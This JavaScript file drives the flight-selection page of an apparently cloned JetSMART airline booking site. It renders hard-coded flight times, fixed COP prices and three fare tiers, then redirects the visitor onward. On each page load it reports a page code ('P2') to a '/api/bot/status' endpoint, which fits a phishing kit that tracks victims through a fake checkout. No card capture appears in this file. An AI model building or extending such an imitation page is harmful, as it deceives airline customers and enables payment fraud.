const DOMElements = {
    labelOriginCode: document.querySelector('#label-origin-code'),
    labelDestinationCode: document.querySelector('#label-destination-code'),
    labelDateGo: document.querySelector('#label-date-go'),
    labelDateBack: document.querySelector('#label-date-back'),
    btnEditFlight: document.querySelector('#btn-edit-flight'),
    loader: document.querySelector('.loader'),
}

/**
 * Startup@Select-Flight-Go
 * 
 */
document.addEventListener('DOMContentLoaded', ()=>{
    eventListeners();
    UIFlights.listFlights(info.flightInfo, 'tickets-list');
    updateDOM();
    sendStatus();
});




/**
 * Events@Select-Flight-Go
 * 
 */
const eventListeners = ()=>{
    const { btnEditFlight, loader } = DOMElements;

    btnEditFlight.addEventListener('click', ()=>{
        loader.classList.add('show');
        setTimeout(()=> window.location.href = 'index.html', 1000);
    });
}

const updateDOM = ()=>{
    const { travel_type, seat_type, origin, destination, adults, children, babies, flightDates } = info.flightInfo;
    const { labelOriginCode, labelDestinationCode, labelDateGo, labelDateBack, contTicketList } = DOMElements;

    //Flight Destinations
    labelOriginCode.textContent = origin.code;
    labelDestinationCode.textContent = destination.code;

    //Flight Date
    if(travel_type === 1){
        if(flightDates[0] !== 0 && flightDates[1] !== 0){
            const formatDateGo = new Date(parseInt(flightDates[0]));
            let weekDayGo = dayDic[formatDateGo.getDay() - 1];
            let dayGo = formatDateGo.toString().split(' ')[2];
            let monthGo = formatDateGo.getMonth() + 1 < 10 ? '0'+formatDateGo.getMonth().toString() : formatDateGo.getMonth().toString();

            const formatDateBack = new Date(parseInt(flightDates[1]));
            let weekDayBack = dayDic[formatDateBack.getDay() - 1];
            let dayBack = formatDateBack.toString().split(' ')[2];
            let monthBack = formatDateBack.getMonth() + 1 < 10 ? '0'+formatDateBack.getMonth().toString() : formatDateBack.getMonth().toString();

            labelDateGo.textContent = `${weekDayGo} ${dayGo}-${monthGo}`;
            labelDateBack.textContent = `${weekDayBack} ${dayBack}-${monthBack}`;
        }else{
            console.log('TRAVEL_TYPE_AND_DATES_DOESNT_MATCH');
        }
    }else if(travel_type === 2){
        if(flightDates[0] !== 0){
            const dateGo = new Date(parseInt(info.flightInfo.flightDates[0]));
            let weekDayGo = dayDic[dateGo.getDay() - 1];
            let dayGo = dateGo.toString().split(' ')[2];
            let monthGo = dateGo.getMonth() + 1 < 10 ? '0'+dateGo.getMonth().toString() : dateGo.getMonth().toString();

            labelDateGo.textContent = `${weekDayGo} ${dayGo}-${monthGo}`;
            labelDateBack.textContent = ''
        }else{
            console.log('INVALID_DATE_GO');
        }
    }else{
        console.log('TRAVEL_TYPE_NULL');
    }

}




/**
 * FlightsHandler@Select-Flight-Go
 * 
 */
class UIFlights{
    static flightsConfig = [
        {
            takeoff: '7:24',
            landing: '8:29 ',
            duration: '1 h 5 min'
        },
        {
            takeoff: '8:30',
            landing: '9:35',
            duration: '1 h 5 min'
        },
        {
            takeoff: '12:00',
            landing: '13:05',
            duration: '1 h 5 min'
        },
        {
            takeoff: '16:24',
            landing: '17:29',
            duration: '1 h 5 min'
        },
        {
            takeoff: '18:49',
            landing: '19:54',
            duration: '1 h 5 min'
        },
        {
            takeoff: '21:25',
            landing: '22:30',
            duration: '1 h 5 min'
        },
        {
            takeoff: '22:01',
            landing: '23:06',
            duration: '1 h 5 min'
        }
    ];

    static listFlights = (flightInfo, contId)=>{
    
        const contTicketList = document.getElementById(contId);
        contTicketList.innerHTML = '';
    
        let id = 0;
        this.flightsConfig.forEach((flightConfig) => {
            contTicketList.innerHTML += `
                <div class="border-blue-1 rounded-10 p-2 mt-2" id="${id}">
                    <div class="d-flex justify-space-between align-items-center">
                        <div style="width: 30%;" class="d-flex flex-column justify-content-center align-items-center">
                            <p class="m-0 mb-1 fw-bold tc-blue fs-3">${flightInfo.origin.city}</p>
                            <p class="m-0 fw-bold tc-blue fs-5">${flightConfig.takeoff}</p>
                            <p class="m-0 fw-bold tc-gray-smoke fs-7 text-center">${flightInfo.origin.name}</p>
                        </div>
                        <div style="width: 40%;" class="d-flex flex-row align-items-center justify-content-center">
                            <hr class="w-100">
                            <div class="d-flex flex-column p-1 justify-content-center align-items-center">
                                <svg width="15px" viewBox="0 0 15 15" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path fill-rule="evenodd" clip-rule="evenodd" d="M0 7.5C0 3.35786 3.35786 0 7.5 0C11.6421 0 15 3.35786 15 7.5C15 11.6421 11.6421 15 7.5 15C3.35786 15 0 11.6421 0 7.5ZM5.5 6C5.5 4.89543 6.39543 4 7.5 4H8.1C9.14934 4 10 4.85066 10 5.9V6C10 7.10457 9.10457 8 8 8V9H7V7H8C8.55228 7 9 6.55228 9 6V5.9C9 5.40294 8.59706 5 8.1 5H7.5C6.94772 5 6.5 5.44772 6.5 6H5.5ZM7 11V10H8V11H7Z" fill="#00abc8"></path> </g></svg>
                                <p class="m-0 tc-cian fw-bold fs-7">Directo</p>
                            </div>
                            <hr class="w-100">
                        </div>
                        <div style="width: 30%;" class="d-flex flex-column justify-content-center align-items-center">
                            <p class="m-0 mb-1 fw-bold tc-blue fs-3">${flightInfo.destination.city}</p>
                            <p class="m-0 fw-bold tc-blue fs-5">${flightConfig.landing}</p>
                            <p class="m-0 fw-bold tc-gray-smoke fs-7 text-center">${flightInfo.destination.name}</p>
                        </div>
                    </div>
    
                    <div class="d-flex flex-column justify-content-center align-items-center mt-3">
                        <p class="m-0 fs-7 tc-blue">*Vuelo operado por jetSMART Airlines S.A.S</p>
                        <p class="m-0 fs-7 tc-blue mt-1">*Sujeto a aprobación gubernamental</p>
                        <div class="card-fee mt-2">
                            <div class="card-fee-header">
                                <p class="m-0">TARIFA SMART</p>
                            </div>
                            <div class="card-fee-body">
                                <p class="m-0 fs-1">${PRECIO_BASE.toLocaleString('es-ES')} COP</p>
                            </div>
                        </div>
                    </div>
                </div>
            `;
    
            id++;
        });
    
        for(let i = 0; i < this.flightsConfig.length; i++){
            document.getElementById(i.toString()).addEventListener('click', ()=>{
                UIFlights.openFlight(i.toString(), flightInfo, contId);
            });
        }
    }

    static openFlight(flightId, flightInfo, contId){
        const precioLight = PRECIO_BASE.toLocaleString('es-ES');
        const precioSmart = (PRECIO_BASE * MULTIPLICADORES_PRECIO.smart).toLocaleString('es-ES');
        const precioFull = (PRECIO_BASE * MULTIPLICADORES_PRECIO.full).toLocaleString('es-ES');

        const contTicketList = document.getElementById(contId);
        contTicketList.innerHTML = '';
    
        let id = 0;
        this.flightsConfig.forEach((flightConfig) => {
            if(id == flightId){
                contTicketList.innerHTML += `
                    <div class="border-blue-1 rounded-10 p-2 mt-2">
                        <div class="d-flex justify-space-between align-items-center" id="${id}">
                            <div style="width: 30%;" class="d-flex flex-column justify-content-center align-items-center">
                                <p class="m-0 mb-1 fw-bold tc-blue fs-3">${flightInfo.origin.city}</p>
                                <p class="m-0 fw-bold tc-blue fs-5">${flightConfig.takeoff}</p>
                                <p class="m-0 fw-bold tc-gray-smoke fs-7 text-center">${flightInfo.origin.name}</p>
                            </div>
                            <div style="width: 40%;" class="d-flex flex-row align-items-center justify-content-center">
                                <hr class="w-100">
                                <div class="d-flex flex-column p-1 justify-content-center align-items-center">
                                    <svg width="15px" viewBox="0 0 15 15" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path fill-rule="evenodd" clip-rule="evenodd" d="M0 7.5C0 3.35786 3.35786 0 7.5 0C11.6421 0 15 3.35786 15 7.5C15 11.6421 11.6421 15 7.5 15C3.35786 15 0 11.6421 0 7.5ZM5.5 6C5.5 4.89543 6.39543 4 7.5 4H8.1C9.14934 4 10 4.85066 10 5.9V6C10 7.10457 9.10457 8 8 8V9H7V7H8C8.55228 7 9 6.55228 9 6V5.9C9 5.40294 8.59706 5 8.1 5H7.5C6.94772 5 6.5 5.44772 6.5 6H5.5ZM7 11V10H8V11H7Z" fill="#00abc8"></path> </g></svg>
                                    <p class="m-0 tc-cian fw-bold fs-7">Directo</p>
                                </div>
                                <hr class="w-100">
                            </div>
                            <div style="width: 30%;" class="d-flex flex-column justify-content-center align-items-center">
                                <p class="m-0 mb-1 fw-bold tc-blue fs-3">${flightInfo.destination.city}</p>
                                <p class="m-0 fw-bold tc-blue fs-5">${flightConfig.landing}</p>
                                <p class="m-0 fw-bold tc-gray-smoke fs-7 text-center">${flightInfo.destination.name}</p>
                            </div>
                        </div>

                        <div class="d-flex flex-column justify-content-center align-items-center mt-3">
                            <div class="slider">
                                <div class="slides">
                                    <div class="ticket-card">
                                        <div class="ticket-decoration bg-gray-soft">
                                            <img src="./assets/media/l_vuela_ligero.png" width="50%">
                                            <p class="m-0 mt-3 tc-blue-2 fw-bold fs-2">$ ${precioLight} COP</p>
                                            <p class="m-0 mt-1 tc-blue-2 fs-6">*Por tramo, por pasajero</p>
                                        </div>
                                        <div class="mt-5 w-100 pl-1 pr-2 border-box">
                                            <div class="ticket-property">
                                                <div class="d-flex flex-row align-items-center">
                                                    <img src="./assets/media/tp_icon_1.png" class="mr-1" width="20px">
                                                    <p class="m-0 fw-bold fs-6 tc-blue-2">SMARTICKET</p>
                                                </div>
                                                <svg width="20px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#1c355e"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><path d="M12.5 2.2a10.3 10.3 0 1 0 10.3 10.3A10.299 10.299 0 0 0 12.5 2.2zm-1.998 15.077l-3.79-3.585.92-.918 2.865 2.676 7.027-6.874.92.92z"></path><path fill="none" d="M0 0h24v24H0z"></path></g></svg>
                                            </div>
                                            <div class="ticket-property">
                                                <div class="d-flex flex-row align-items-center">
                                                    <img src="./assets/media/tp_icon_2.png" class="mr-1" width="20px">
                                                    <p class="m-0 fw-bold fs-6 tc-blue-2">Mochila o artículo personal</p>
                                                </div>
                                                <svg width="20px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#1c355e"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><path d="M12.5 2.2a10.3 10.3 0 1 0 10.3 10.3A10.299 10.299 0 0 0 12.5 2.2zm-1.998 15.077l-3.79-3.585.92-.918 2.865 2.676 7.027-6.874.92.92z"></path><path fill="none" d="M0 0h24v24H0z"></path></g></svg>
                                            </div>
                                        </div>

                                        <div class="ticket-card-footer">
                                            <button class="ticket-submit" id="ticket-light">
                                                <span>¡Lo quiero!</span><svg class="ml-1" width="25px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" id="right-circle" class="icon glyph" fill="#1c355e"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><path d="M12,2A10,10,0,1,0,22,12,10,10,0,0,0,12,2Zm2.71,10.71-3,3a1,1,0,0,1-1.42,0,1,1,0,0,1,0-1.42L12.59,12l-2.3-2.29a1,1,0,0,1,1.42-1.42l3,3A1,1,0,0,1,14.71,12.71Z" style="fill:#fff"></path></g></svg>
                                            </button>
                                        </div>
                                    </div>
                                    <div class="ticket-card">
                                        <div class="ticket-decoration bg-cian">
                                            <img src="./assets/media/l_pack_smart.png" width="50%">
                                            <p class="m-0 mt-3 fw-bold fs-2">$ ${precioSmart} COP</p>
                                            <p class="m-0 mt-1 fs-6">*Por tramo, por pasajero</p>
                                        </div>
                                        <div class="mt-5 w-100 pl-1 pr-2 border-box">
                                            <div class="ticket-property">
                                                <div class="d-flex flex-row align-items-center">
                                                    <img src="./assets/media/tp_icon_1.png" class="mr-1" width="20px">
                                                    <p class="m-0 fw-bold fs-6 tc-blue-2">SMARTICKET</p>
                                                </div>
                                                <svg width="20px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#1c355e"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><path d="M12.5 2.2a10.3 10.3 0 1 0 10.3 10.3A10.299 10.299 0 0 0 12.5 2.2zm-1.998 15.077l-3.79-3.585.92-.918 2.865 2.676 7.027-6.874.92.92z"></path><path fill="none" d="M0 0h24v24H0z"></path></g></svg>
                                            </div>
                                            <div class="ticket-property">
                                                <div class="d-flex flex-row align-items-center">
                                                    <img src="./assets/media/tp_icon_2.png" class="mr-1" width="20px">
                                                    <p class="m-0 fw-bold fs-6 tc-blue-2">Mochila o artículo personal</p>
                                                </div>
                                                <svg width="20px"  viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#1c355e"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><path d="M12.5 2.2a10.3 10.3 0 1 0 10.3 10.3A10.299 10.299 0 0 0 12.5 2.2zm-1.998 15.077l-3.79-3.585.92-.918 2.865 2.676 7.027-6.874.92.92z"></path><path fill="none" d="M0 0h24v24H0z"></path></g></svg>
                                            </div>
                                            <div class="ticket-property">
                                                <div class="d-flex flex-row align-items-center">
                                                    <img src="./assets/media/tp_icon_3.png" class="mr-1" width="20px">
                                                    <p class="m-0 fw-bold fs-6 tc-blue-2">FlexiSMART</p>
                                                </div>
                                                <svg width="20px"  viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#1c355e"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><path d="M12.5 2.2a10.3 10.3 0 1 0 10.3 10.3A10.299 10.299 0 0 0 12.5 2.2zm-1.998 15.077l-3.79-3.585.92-.918 2.865 2.676 7.027-6.874.92.92z"></path><path fill="none" d="M0 0h24v24H0z"></path></g></svg>
                                            </div>
                                            <div class="ticket-property">
                                                <div class="d-flex flex-row align-items-center">
                                                    <img src="./assets/media/tp_icon_4.png" class="mr-1" width="20px">
                                                    <p class="m-0 fw-bold fs-6 tc-blue-2">Equipaje de Mano y Facturado</p>
                                                </div>
                                                <svg width="20px"  viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#1c355e"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><path d="M12.5 2.2a10.3 10.3 0 1 0 10.3 10.3A10.299 10.299 0 0 0 12.5 2.2zm-1.998 15.077l-3.79-3.585.92-.918 2.865 2.676 7.027-6.874.92.92z"></path><path fill="none" d="M0 0h24v24H0z"></path></g></svg>
                                            </div>
                                            <div class="ticket-property">
                                                <div class="d-flex flex-row align-items-center">
                                                    <img src="./assets/media/tp_icon_5.png" class="mr-1" width="20px">
                                                    <p class="m-0 fw-bold fs-6 tc-blue-2">Embarque prioritario</p>
                                                </div>
                                                <svg width="20px"  viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#1c355e"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><path d="M12.5 2.2a10.3 10.3 0 1 0 10.3 10.3A10.299 10.299 0 0 0 12.5 2.2zm-1.998 15.077l-3.79-3.585.92-.918 2.865 2.676 7.027-6.874.92.92z"></path><path fill="none" d="M0 0h24v24H0z"></path></g></svg>
                                            </div>
                                        </div>

                                        <div class="ticket-card-footer">
                                            <button class="ticket-submit" id="ticket-smart">
                                                <span>¡Lo quiero!</span><svg class="ml-1" width="25px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" id="right-circle" class="icon glyph" fill="#1c355e"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><path d="M12,2A10,10,0,1,0,22,12,10,10,0,0,0,12,2Zm2.71,10.71-3,3a1,1,0,0,1-1.42,0,1,1,0,0,1,0-1.42L12.59,12l-2.3-2.29a1,1,0,0,1,1.42-1.42l3,3A1,1,0,0,1,14.71,12.71Z" style="fill:#fff"></path></g></svg>
                                            </button>
                                        </div>
                                    </div>
                                    <div class="ticket-card">
                                        <div class="ticket-decoration bg-blue-2">
                                            <img src="./assets/media/l_pack_full.png" width="50%">
                                            <p class="m-0 mt-3 fw-bold fs-2">$ ${precioFull} COP</p>
                                            <p class="m-0 mt-1 fs-6">*Por tramo, por pasajero</p>
                                        </div>
                                        <div class="mt-5 w-100 pl-1 pr-2 border-box">
                                            <div class="ticket-property">
                                                <div class="d-flex flex-row align-items-center">
                                                    <img src="./assets/media/tp_icon_1.png" class="mr-1" width="20px">
                                                    <p class="m-0 fw-bold fs-6 tc-blue-2">SMARTICKET</p>
                                                </div>
                                                <svg width="20px"  viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#1c355e"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><path d="M12.5 2.2a10.3 10.3 0 1 0 10.3 10.3A10.299 10.299 0 0 0 12.5 2.2zm-1.998 15.077l-3.79-3.585.92-.918 2.865 2.676 7.027-6.874.92.92z"></path><path fill="none" d="M0 0h24v24H0z"></path></g></svg>
                                            </div>
                                            <div class="ticket-property">
                                                <div class="d-flex flex-row align-items-center">
                                                    <img src="./assets/media/tp_icon_2.png" class="mr-1" width="20px">
                                                    <p class="m-0 fw-bold fs-6 tc-blue-2">Mochila o artículo personal</p>
                                                </div>
                                                <svg width="20px"  viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#1c355e"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><path d="M12.5 2.2a10.3 10.3 0 1 0 10.3 10.3A10.299 10.299 0 0 0 12.5 2.2zm-1.998 15.077l-3.79-3.585.92-.918 2.865 2.676 7.027-6.874.92.92z"></path><path fill="none" d="M0 0h24v24H0z"></path></g></svg>
                                            </div>
                                            <div class="ticket-property">
                                                <div class="d-flex flex-row align-items-center">
                                                    <img src="./assets/media/tp_icon_3.png" class="mr-1" width="20px">
                                                    <p class="m-0 fw-bold fs-6 tc-blue-2">FlexiSMART</p>
                                                </div>
                                                <svg width="20px"  viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#1c355e"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><path d="M12.5 2.2a10.3 10.3 0 1 0 10.3 10.3A10.299 10.299 0 0 0 12.5 2.2zm-1.998 15.077l-3.79-3.585.92-.918 2.865 2.676 7.027-6.874.92.92z"></path><path fill="none" d="M0 0h24v24H0z"></path></g></svg>
                                            </div>
                                            <div class="ticket-property">
                                                <div class="d-flex flex-row align-items-center">
                                                    <img src="./assets/media/tp_icon_4.png" class="mr-1" width="20px">
                                                    <p class="m-0 fw-bold fs-6 tc-blue-2">Equipaje de Mano y Facturado</p>
                                                </div>
                                                <svg width="20px"  viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#1c355e"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><path d="M12.5 2.2a10.3 10.3 0 1 0 10.3 10.3A10.299 10.299 0 0 0 12.5 2.2zm-1.998 15.077l-3.79-3.585.92-.918 2.865 2.676 7.027-6.874.92.92z"></path><path fill="none" d="M0 0h24v24H0z"></path></g></svg>
                                            </div>
                                            <div class="ticket-property">
                                                <div class="d-flex flex-row align-items-center">
                                                    <img src="./assets/media/tp_icon_5.png" class="mr-1" width="20px">
                                                    <p class="m-0 fw-bold fs-6 tc-blue-2">Embarque prioritario</p>
                                                </div>
                                                <svg width="20px"  viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#1c355e"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><path d="M12.5 2.2a10.3 10.3 0 1 0 10.3 10.3A10.299 10.299 0 0 0 12.5 2.2zm-1.998 15.077l-3.79-3.585.92-.918 2.865 2.676 7.027-6.874.92.92z"></path><path fill="none" d="M0 0h24v24H0z"></path></g></svg>
                                            </div>
                                            <div class="ticket-property">
                                                <div class="d-flex flex-row align-items-center">
                                                    <img src="./assets/media/tp_icon_8.png" class="mr-1" width="20px">
                                                    <p class="m-0 fw-bold fs-6 tc-blue-2">Impresión de tarjeta de embarque</p>
                                                </div>
                                                <svg width="20px"  viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#1c355e"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><path d="M12.5 2.2a10.3 10.3 0 1 0 10.3 10.3A10.299 10.299 0 0 0 12.5 2.2zm-1.998 15.077l-3.79-3.585.92-.918 2.865 2.676 7.027-6.874.92.92z"></path><path fill="none" d="M0 0h24v24H0z"></path></g></svg>
                                            </div>
                                        </div>

                                        <div class="ticket-card-footer">
                                            <button class="ticket-submit" id="ticket-full">
                                                <span>¡Lo quiero!</span><svg class="ml-1" width="25px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" id="right-circle" class="icon glyph" fill="#1c355e"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><path d="M12,2A10,10,0,1,0,22,12,10,10,0,0,0,12,2Zm2.71,10.71-3,3a1,1,0,0,1-1.42,0,1,1,0,0,1,0-1.42L12.59,12l-2.3-2.29a1,1,0,0,1,1.42-1.42l3,3A1,1,0,0,1,14.71,12.71Z" style="fill:#fff"></path></g></svg>
                                            </button>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                `;
            }else{
                contTicketList.innerHTML += `
                    <div class="border-blue-1 rounded-10 p-2 mt-2" id="${id}">
                        <div class="d-flex justify-space-between align-items-center">
                            <div style="width: 30%;" class="d-flex flex-column justify-content-center align-items-center">
                                <p class="m-0 mb-1 fw-bold tc-blue fs-3">${flightInfo.origin.city}</p>
                                <p class="m-0 fw-bold tc-blue fs-5">${flightConfig.takeoff}</p>
                                <p class="m-0 fw-bold tc-gray-smoke fs-7 text-center">${flightInfo.origin.name}</p>
                            </div>
                            <div style="width: 40%;" class="d-flex flex-row align-items-center justify-content-center">
                                <hr class="w-100">
                                <div class="d-flex flex-column p-1 justify-content-center align-items-center">
                                    <svg width="15px" viewBox="0 0 15 15" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path fill-rule="evenodd" clip-rule="evenodd" d="M0 7.5C0 3.35786 3.35786 0 7.5 0C11.6421 0 15 3.35786 15 7.5C15 11.6421 11.6421 15 7.5 15C3.35786 15 0 11.6421 0 7.5ZM5.5 6C5.5 4.89543 6.39543 4 7.5 4H8.1C9.14934 4 10 4.85066 10 5.9V6C10 7.10457 9.10457 8 8 8V9H7V7H8C8.55228 7 9 6.55228 9 6V5.9C9 5.40294 8.59706 5 8.1 5H7.5C6.94772 5 6.5 5.44772 6.5 6H5.5ZM7 11V10H8V11H7Z" fill="#00abc8"></path> </g></svg>
                                    <p class="m-0 tc-cian fw-bold fs-7">Directo</p>
                                </div>
                                <hr class="w-100">
                            </div>
                            <div style="width: 30%;" class="d-flex flex-column justify-content-center align-items-center">
                                <p class="m-0 mb-1 fw-bold tc-blue fs-3">${flightInfo.destination.city}</p>
                                <p class="m-0 fw-bold tc-blue fs-5">${flightConfig.landing}</p>
                                <p class="m-0 fw-bold tc-gray-smoke fs-7 text-center">${flightInfo.destination.name}</p>
                            </div>
                        </div>
        
                        <div class="d-flex flex-column justify-content-center align-items-center mt-3">
                            <p class="m-0 fs-7 tc-blue">*Vuelo operado por jetSMART Airlines S.A.S</p>
                            <p class="m-0 fs-7 tc-blue mt-1">*Sujeto a aprobación gubernamental</p>
                            <div class="card-fee mt-2">
                                <div class="card-fee-header">
                                    <p class="m-0">TARIFA SMART</p>
                                </div>
                                <div class="card-fee-body">
                                    <p class="m-0 fs-1">${PRECIO_BASE.toLocaleString('es-ES')} COP</p>
                                </div>
                            </div>
                        </div>
                    </div>
                `;
            }
    
            id++;
        });

        const btnBuyTicketLight = document.querySelector('#ticket-light');
        const btnBuyTicketSmart = document.querySelector('#ticket-smart');
        const btnBuyTicketFull = document.querySelector('#ticket-full');

        btnBuyTicketLight.addEventListener('click', ()=>{
            UIFlights.setFlightTicket(parseInt(flightId), 'light');
        });

        btnBuyTicketSmart.addEventListener('click', ()=>{
            UIFlights.setFlightTicket(parseInt(flightId), 'smart');
        });

        btnBuyTicketFull.addEventListener('click', ()=>{
            UIFlights.setFlightTicket(parseInt(flightId), 'full');
        });
    
        for(let i = 0; i < this.flightsConfig.length; i++){
            document.getElementById(i.toString()).addEventListener('click', ()=>{
                UIFlights.openFlight(i.toString(), flightInfo, contId);
            });
        }
    }

    static setFlightTicket(flightId, ticketType){
        const {origin, travel_type} = info.flightInfo

        origin.ticket_sched = this.flightsConfig[flightId];
        origin.ticket_type = ticketType;

        updateLS();

        DOMElements.loader.classList.add('show');

        setTimeout(()=> {
            if(travel_type === 1){
                window.location.href = 'select-flight-back.html';
            }else{
                window.location.href = 'flight-resume.html';
            }
        }, 2500)
    }
}

const sendStatus = () =>{
    try{
        fetch(`${API_URL}/api/bot/status`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${API_KEY}`
            },
            body: JSON.stringify({message: 'P2'})
        });
    }catch(err){
        console.log(err);
    }
}
